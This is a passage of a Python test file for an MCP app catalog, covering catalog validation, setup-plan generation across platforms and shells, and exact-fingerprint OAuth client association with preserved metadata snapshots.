        for item in payload["apps"][0]["variants"]
        if item["id"] == "claude-code-cli-oauth"
    )
    variant["requires"]["platform"] = ["windows", "linux"]
    recipe = next(
        item
        for item in payload["recipes"]
        if item["id"] == "claude-code-cli-oauth-r1"
    )
    recipe["selectors"]["platform"] = "windows"
    (target / "catalog.v1.json").write_text(json.dumps(payload), encoding="utf-8")

    with pytest.raises(CatalogValidationError, match="recipe coverage missing"):
        CatalogRepository(target).snapshot()


@pytest.mark.parametrize("platform", [None, "windows", "macos", "linux"])
@pytest.mark.parametrize("shell", [None, "powershell", "bash", "zsh"])
def test_every_available_packaged_variant_has_a_setup_plan(platform, shell):
    repository = CatalogRepository()
    context = SetupContext(
        endpoint_reachability="public-https",
        platform=platform,
        shell=shell,
    )
    server = ServerMcpCapabilities(
        oauth_available=True,
        transports=frozenset({"streamable-http"}),
        endpoint_reachability=frozenset({"public-https"}),
    )
    planner = SetupPlanner(repository)
    for app in repository.snapshot().apps:
        options = CompatibilityEvaluator().evaluate(app.variants, server, context)
        for option in options:
            if option.available:
                assert planner.plan_for_app(
                    app_id=app.id,
                    variant_id=option.variant_id,
                    context=context,
                ).variant_id == option.variant_id


def test_presentation_and_command_generation_have_no_known_app_id_branch():
    # Config-file patch adapters are selected by a closed capability ID;
    # association resolution and symbolic command generation must stay open to
    # data-only ordinary apps.
    sources = (
        inspect.getsource(api_token_service.resolve_catalog_app_association),
        inspect.getsource(mcp_http_register._render_cli_setup),
        inspect.getsource(mcp_http_register._local_config_adapter),
    )

    for source in sources:
        assert '"claude-code"' not in source
        assert '"codex"' not in source


def test_oauth_association_requires_exact_fingerprint_and_preserves_snapshot(
    tmp_path,
):
    target, payload = _copied_catalog(tmp_path)
    fingerprint = "a" * 64
    app = payload["apps"][0]
    app["oauthIdentities"] = [
        {
            "kind": "exact-registration-profile",
            "normalizedMetadataFingerprint": fingerprint,
            "provenanceRef": app["verification"]["provenance"][0]["sourceUrl"],
        }
    ]
    (target / "catalog.v1.json").write_text(json.dumps(payload), encoding="utf-8")
    repository = CatalogRepository(target)

    verified = repository.find_verified_oauth_association(fingerprint)
    assert verified is not None
    assert verified.catalog_app_id == "claude-code"
    assert verified.label_snapshot == "Claude Code"
    # A self-asserted matching name or near/fuzzy fingerprint never associates.
    assert repository.find_verified_oauth_association("a" * 63 + "b") is None
    client = OAuthClient(
        id="dyn_fixture",
        client_name="Claude Code",
        redirect_uris=["http://127.0.0.1/callback"],
        token_endpoint_auth_method="none",
        grant_types=["authorization_code", "refresh_token"],
        response_types=["code"],
        application_type="native",
        scope="mcp:read",
        created_via="dcr",
        registration_identity=fingerprint,
    )
    _apply_verified_oauth_association(
        client,
        metadata_fingerprint="a" * 63 + "b",
        association=None,
        replace_unconsented=False,
    )
    assert client.catalog_app_id is None

    _apply_verified_oauth_association(
        client,
        metadata_fingerprint=fingerprint,
        association=verified,
        replace_unconsented=False,
    )
    assert client.catalog_app_id == "claude-code"
    assert client.catalog_app_label_snapshot == "Claude Code"
    original_revision = client.catalog_revision

    # Existing DCR metadata is immutable. A later catalog rename/removal cannot
    # rewrite the snapshot or make the credential unmanageable.
    _apply_verified_oauth_association(
        client,
        metadata_fingerprint=fingerprint,
        association=None,
        replace_unconsented=False,
    )
    assert client.catalog_app_id == "claude-code"
    assert client.catalog_app_label_snapshot == "Claude Code"
    assert client.catalog_revision == original_revision


def _copied_catalog(tmp_path: Path) -> tuple[Path, dict]:
    source = Path(__file__).resolve().parents[3] / "catalog" / "mcp_apps"
    target = tmp_path / "catalog"
    shutil.copytree(source, target)
    payload = json.loads((target / "catalog.v1.json").read_text(encoding="utf-8"))
    return target, payload
